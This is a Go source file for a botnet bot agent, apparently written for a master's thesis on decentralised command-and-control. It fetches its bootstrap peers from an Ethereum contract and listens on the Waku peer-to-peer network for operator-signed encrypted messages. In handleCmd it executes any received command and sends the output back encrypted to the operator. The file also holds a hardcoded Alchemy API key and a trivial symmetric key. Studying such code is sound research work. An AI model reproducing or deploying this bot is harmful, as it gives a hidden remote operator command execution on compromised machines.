package main // Defines the package name, 'main' indicates that this is an executable program, not a library.

import (
	"bytes"        // Importing bytes package to manipulate slices of bytes.
	"context"      // Provides functionality to carry deadlines, cancellation signals, and other request-scoped values across API boundaries.
	"crypto/ecdsa" // Provides elliptic curve cryptographic functionalities, specifically using the ECDSA algorithm.
	"crypto/rand"  // Imports cryptographic functions for generating random numbers.
	"encoding/hex" // Provides functionality to encode and decode string values in hexadecimal.
	"flag"
	"fmt"       // Basic formatting for input and output, including printing to console.
	"net"       // Provides a portable interface for network I/O, including TCP/IP, UDP, domain name resolution, and Unix domain sockets.
	"os"        // Provides functions for interacting with the operating system, including file and process management.
	"os/exec"   // Allows running external commands through the operating system.
	"os/signal" // Provides mechanisms to receive notifications on process interruptions.
	"strings"   // Contains utilities for string manipulation.
	"syscall"   // Low-level interface for system calls.

	// Third-party packages:
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto" // Ethereum crypto package, provides tools for Ethereum-specific cryptographic operations.
	"github.com/ethereum/go-ethereum/ethclient"
	logging "github.com/ipfs/go-log/v2"                         // Advanced logging library used by IPFS, capable of logging with different levels.
	"github.com/multiformats/go-multiaddr"                      // Library to handle multiaddr, a standard way to represent network addresses that support multiple protocols.
	"github.com/waku-org/go-waku/waku/v2/node"                  // Part of Waku's implementation of decentralized messaging following the Waku v2 specifications.
	"github.com/waku-org/go-waku/waku/v2/payload"               // Handles the payload part of Waku messages.
	wps "github.com/waku-org/go-waku/waku/v2/peerstore"         // Peer storage utilities for managing peers in Waku network.
	"github.com/waku-org/go-waku/waku/v2/protocol"              // Contains the protocol definitions for Waku.
	"github.com/waku-org/go-waku/waku/v2/protocol/filter"       // Filtering functionalities for Waku messages.
	"github.com/waku-org/go-waku/waku/v2/protocol/pb"           // Protobuf definitions for Waku.
	"github.com/waku-org/go-waku/waku/v2/protocol/relay"        // Relay protocol to facilitate message passing between Waku nodes.
	"github.com/waku-org/go-waku/waku/v2/protocol/subscription" // Subscription management for Waku nodes.
	"github.com/waku-org/go-waku/waku/v2/utils"                 // Utility functions for the Waku protocol.
	"google.golang.org/protobuf/proto"                          // Google's protocol buffers package.
)

// LogLevel defines levels of logging based on severity and action required.
type LogLevel int

const (
	LogInfo      LogLevel                                               = iota // LogInfo is used for non-critical informational messages.
	LogError                                                                   // LogError is used for standard error logging.
	LogFatal                                                                   // LogFatal is used for errors that require the application to terminate.
	contentTopic = "/masterThesis/1/command-control-registration/proto"        // Constant for defining a specific content topic for messages.
)

// Global variables for application-wide use.
var (
	log         = logging.Logger("lightnode")   // Logger configured for the 'lightnode' module.
	pubSubTopic = protocol.DefaultPubsubTopic{} // Default publication/subscription topic for the node.
	symKey      = []byte{                       // Predefined symmetric key for encryption.
		1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
		17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32,
	}
	publicKey = "c6336466e3e4bdb1122b499a3f820db99813a412eb780d41596498126e34150294d74f2d47baf564c7b362508da6b02af37f43e9aaea204baed7564c98e38c6e" // Public key for asymmetric encryption.
)

func main() {
	// Parse command line arguments to get bot and bootstrap addresses.
	botAddress, bootstrapAddress := parseCommandLineArgs()

	// Resolve the TCP address from the parsed bot address.
	hostAddr := resolveTCPAddr(botAddress)

	// Generate a private key for node encryption purposes.
	prvKey := generatePrivateKey()

	// Create a context with cancellation capabilities to manage lifecycle of goroutines.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel() // Ensure the cancel function is called on function exit to cleanup resources.

	// Setup the Waku node with the provided context, host address, and private key.
	lightNode := setupNode(ctx, hostAddr, prvKey)
	defer lightNode.Stop() // Ensure node is stopped on function exit.

	// Subscribe to other nodes using the lightNode and the bootstrap address.
	filter := subscribeToNode(ctx, lightNode, bootstrapAddress)

	// Start listening for messages.
	listenForMessages(ctx, lightNode, filter)

	// Wait for an OS signal to gracefully shutdown the node.
	waitForSignalAndShutdown()

	// Properly shutdown the node.
	shutdownNode(lightNode)
}

func parseCommandLineArgs() (string, []string) {
	botAddress := flag.String("botAddress", "0.0.0.0:60001", "The address that the bot node should bind to")
	bootstrapAddress := flag.String("bootstrapAddress", "", "The address of the bootstrap node to connect to")

	flag.Parse()

	// Handle cases where no bootstrap address is provided
	if *bootstrapAddress == "" {
		fmt.Println("No bootstrap address provided, fetching from contract...")
		bootstrapAddresses := fetchBootstrapAddressesFromContract()
		if len(bootstrapAddresses) > 0 {
			return *botAddress, bootstrapAddresses
		} else {
			log.Fatal("No bootstrap addresses could be retrieved from the contract.")
		}
	}

	// Return the manually provided address wrapped in a slice for consistency with return type
	return *botAddress, []string{*bootstrapAddress}
}

// Function to fetch bootstrap addresses from a specified Ethereum contract
func fetchBootstrapAddressesFromContract() []string {

	// Connect to the Ethereum client using the Alchemy API endpoint for the Sepolia testnet
	client, err := ethclient.Dial("https://eth-sepolia.g.alchemy.com/v2/U3mHHeBpgcIkNihIINnOav05_MnkRGWp")
	// Check for connection errors
	if err != nil {
		// Log the error and terminate the program if the connection fails
		log.Fatalf("Failed to connect to the Ethereum client: %v", err)
	}

	// Define the address of the Ethereum contract to interact with
	contractAddress := common.HexToAddress("0xE2bB5cfe996ABeD8eB82bECB7Ede59faa17fe2F0")

	// Create a new instance of the contract by binding to the specified address and Ethereum client
	contractInstance, err := NewMain(contractAddress, client)
	// Check for errors in binding to the contract
	if err != nil {
		// Log the error and terminate the program if binding fails
		log.Fatalf("Failed to bind to contract: %v", err)
	}

	// Call the 'GetBootstrapAddresses' method of the contract to retrieve the bootstrap addresses
	bootstrapAddresses, err := contractInstance.GetBootstrapAddresses(nil)
	// Check for errors in retrieving the bootstrap addresses
	if err != nil {
		// Log the error and terminate the program if retrieval fails
		log.Fatalf("Failed to retrieve bootstrap addresses: %v", err)
	}

	// Print the retrieved bootstrap addresses to the console
	fmt.Println("Bootstrap addresses retrieved from contract:")
	for _, address := range bootstrapAddresses {
		// Print each address in the list
		fmt.Println(address)
	}

	// Return the list of bootstrap addresses
	return bootstrapAddresses
}

// resolveTCPAddr resolves a string address into a net.TCPAddr structure.
func resolveTCPAddr(address string) *net.TCPAddr {
	hostAddr, err := net.ResolveTCPAddr("tcp", address)        // Resolve the TCP address from a string.
	checkError(err, "Could not resolve TCP address", LogFatal) // Check for errors and log fatal if there are any issues.
	return hostAddr                                            // Return the resolved TCP address.
}

// generatePrivateKey generates a new ECDSA private key.
func generatePrivateKey() *ecdsa.PrivateKey {
	key, err := randomHex(32)                                  // Generate a random hexadecimal string of length 32 bytes.
	checkError(err, "Could not generate random key", LogFatal) // Check for errors in random key generation.
	prvKey, err := crypto.HexToECDSA(key)                      // Convert the hex string to an ECDSA private key.
	checkError(err, "Invalid key", LogFatal)                   // Check for errors in converting to ECDSA private key.
	return prvKey                                              // Return the generated private key.
}

// setupNode initializes and starts a new Waku node with the given settings.
func setupNode(ctx context.Context, hostAddr *net.TCPAddr, prvKey *ecdsa.PrivateKey) *node.WakuNode {
	lightNode, err := node.New( // Attempt to create a new Waku node with the provided options.
		node.WithPrivateKey(prvKey),
		node.WithHostAddress(hostAddr),
		node.WithWakuRelay(),
		node.WithWakuFilterLightNode(),
	)
	checkError(err, "Error initializing node", LogFatal) // Check for errors in node initialization.
	err = lightNode.Start(ctx)                           // Start the node.
	checkError(err, "Error starting node", LogFatal)     // Check for errors in starting the node.
	return lightNode                                     // Return the initialized and started node.
}

// subscribeToNode connects the local node to the first successful bootstrap node from a list and subscribes to content filters.
func subscribeToNode(ctx context.Context, lightNode *node.WakuNode, bootstrapAddresses []string) []*subscription.SubscriptionDetails {
	for _, address := range bootstrapAddresses {
		// Create a multiaddress from the given bootstrap address string.
		bootstrapMultiAddress, err := multiaddr.NewMultiaddr(address)
		if err != nil {
			log.Error("Error parsing bootstrap node multiaddr: ", err)
			continue // Try the next address if the current one fails
		}

		// Attempt to add the bootstrap node as a peer to the local node.
		_, err = lightNode.AddPeer(bootstrapMultiAddress, wps.Static, []string{pubSubTopic.String()}, filter.FilterSubscribeID_v20beta1)
		if err != nil {
			log.Error("Error adding filter peer on light node: ", err)
			continue // Try the next address if the current one fails
		}

		// Set up a content filter with the default Waku topic and specific content topic.
		cf := protocol.ContentFilter{
			PubsubTopic:   relay.DefaultWakuTopic,
			ContentTopics: protocol.NewContentTopicSet(contentTopic),
		}
		// Subscribe to the filter service using the content filter configuration.
		filter, err := lightNode.FilterLightnode().Subscribe(ctx, cf)
		if err != nil {
			log.Error("Error subscribing: ", err)
			continue // Try the next address if the current one fails
		}

		// If successful, return the subscription details for this connection.
		return filter
	}

	// If no connections were successful, log a fatal error or handle it accordingly.
	log.Fatal("Failed to connect to any bootstrap nodes")
	return nil // This line will actually never be reached because log.Fatal will terminate the program
}

// listenForMessages listens for incoming messages that match the subscription filters.
func listenForMessages(ctx context.Context, lightNode *node.WakuNode, filter []*subscription.SubscriptionDetails) {
	// Start a new goroutine to handle messages asynchronously.
	go func() {
		// Continuously listen for new messages.
		for {
			select {
			case <-ctx.Done(): // Check if the context is cancelled.
				return // Exit the loop and goroutine if context is done.
			case env := <-filter[0].C: // Read a message from the subscription channel.
				if env.Message() != nil { // Check if the message is not nil.
					// Decode the message payload using the symmetric key.
					messagePayload, err := payload.DecodePayload(env.Message(), &payload.KeyInfo{
						Kind:   payload.Symmetric,
						SymKey: symKey,
					})
					// Check for errors in decoding, log as error if there's an issue.
					if err != nil {
						checkError(err, "Error decoding payload: ", LogError)
						continue // Skip processing if the payload cannot be decoded.
					}

					// Ensure the public key exists before attempting to access it.
					if messagePayload.PubKey == nil {
						log.Info("Received message does not contain a public key.")
						continue // Skip processing if the public key is missing.
					}

					// Format the public key parts to compare with the expected public key.
					retrievedPublicKey := fmt.Sprintf("%x%x", messagePayload.PubKey.X, messagePayload.PubKey.Y)
					if retrievedPublicKey != publicKey {
						log.Info("Public key mismatch.")
						continue // Skip processing if the public key does not match.
					}

					// Convert the message data to a string for handling.
					messageText := string(messagePayload.Data)
					fmt.Printf("Filtered message received: %s\n", messageText)
					// Handle the message in a new goroutine.
					go handleMessage(ctx, lightNode, messageText)
				}
			}
		}
	}()
}

// waitForSignalAndShutdown blocks until an OS signal is received.
func waitForSignalAndShutdown() {
	ch := make(chan os.Signal, 1)                      // Create a channel to receive OS signals.
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM) // Listen for interrupt and terminate signals.
	<-ch                                               // Block until a signal is received.
	fmt.Println("Received signal, shutting down...")   // Log shutdown initiation.
}

// shutdownNode gracefully stops the given Waku node.
func shutdownNode(fullNode *node.WakuNode) {
	fullNode.Stop()                       // Stop the node's operation.
	fmt.Println("Node has been stopped.") // Log that the node has been stopped.
}

// randomHex generates a random hexadecimal string of the specified length.
func randomHex(n int) (string, error) {
	bytes := make([]byte, n)                    // Allocate a slice of bytes.
	if _, err := rand.Read(bytes); err != nil { // Fill the slice with random bytes.
		checkError(err, "Could not read random bytes", LogError) // Check for errors and log as error.
		return "", err                                           // Return an empty string and the error.
	}
	return hex.EncodeToString(bytes), nil // Encode the bytes as a hexadecimal string and return.
}

// handleMessage processes received messages by determining their type and dispatching them accordingly.
func handleMessage(ctx context.Context, wakuNode *node.WakuNode, messageText string) {
	// Split the incoming message into parts using ":" as the delimiter, expecting exactly 3 parts.
	parts := strings.SplitN(messageText, ":", 3)

	// Check if the message has exactly three parts as expected.
	if len(parts) != 3 {
		log.Info("Received message does not have three parts and will be ignored.")
		return
	}

	// Trim whitespace and store the second and third parts as messageType and messageContent.
	messageType := strings.TrimSpace(parts[1])
	messageContent := strings.TrimSpace(parts[2])

	// Switch on the type of message received.
	switch messageType {
	case "cmd":
		log.Info("Command message detected, processing...")
		handleCmd(messageContent, ctx, wakuNode) // Handle the command message.
	default:
		log.Info("Received an unsupported message type.")
	}
}

// handleCmd executes a system command received in a message.
func handleCmd(control string, ctx context.Context, wakuNode *node.WakuNode) {
	// Create a new system command based on the message content.
	cmd := exec.Command(control)
	var out bytes.Buffer                      // Buffer to capture output from the command.
	cmd.Stdout = &out                         // Redirect command output to buffer.
	cmd.Run()                                 // Execute the command without waiting for it to finish.
	result := strings.TrimSpace(out.String()) // Trim space from command output to clean up the result.

	// Pass the result of the command execution back for messaging.
	write(ctx, wakuNode, result)
}

// write sends a message via the Waku network.
func write(ctx context.Context, wakuNode *node.WakuNode, msgContent string) {
	var version uint32 = 1 // Define the message version, typically a protocol-specific detail.

	// Decode the stored public key to send the message.
	pubKeyBytes, err := hex.DecodeString("04" + publicKey)
	checkError(err, "Failed to decode hex string", LogFatal)

	// Verify the public key is in uncompressed format.
	if pubKeyBytes[0] != 0x04 {
		log.Fatal("Public key must be uncompressed, invalid key format detected.")
	}

	// Convert bytes to an ECDSA public key.
	pubKey, err := crypto.UnmarshalPubkey(pubKeyBytes)
	checkError(err, "Failed to unmarshal public key", LogFatal)

	// Create a new payload for the message.
	p := new(payload.Payload)
	p.Data = []byte(wakuNode.ID() + ": " + msgContent) // Include sender's ID in message content.
	p.Key = &payload.KeyInfo{
		Kind:   payload.Asymmetric,
		PubKey: *pubKey,
	}

	// Encode the payload for sending.
	encodedPayload, err := p.Encode(version)
	checkError(err, "Failed to encode payload", LogFatal)

	// Construct the Waku message with the encoded payload.
	msg := &pb.WakuMessage{
		Payload:      encodedPayload,
		Version:      proto.Uint32(version),
		ContentTopic: contentTopic,
		Timestamp:    utils.GetUnixEpoch(wakuNode.Timesource()),
	}

	// Publish the message over the Waku network.
	wakuNode.Relay().Publish(ctx, msg, relay.WithPubSubTopic(pubSubTopic.String()))
}

// checkError evaluates an error and handles it according to a specified LogLevel.
func checkError(err error, message string, level LogLevel) {
	// Check if the error object is not nil, indicating an error has occurred.
	if err != nil {
		// Handle the error based on the provided LogLevel.
		switch level {
		case LogInfo:
			// Log the error with an informational level, which is typically used for non-critical issues.
			log.Info(message, err)
		case LogError:
			// Log the error with an error level, suitable for most errors that need attention but are not critical.
			log.Error(message, err)
		case LogFatal:
			// Log the error and terminate the program; used for critical issues that require immediate stopping of the program.
			log.Fatalf("%s: %v", message, err)
		default:
			// Handle cases where the log level is not recognized.
			log.Error("Unhandled log level", "provided level", level)
		}
	}
}
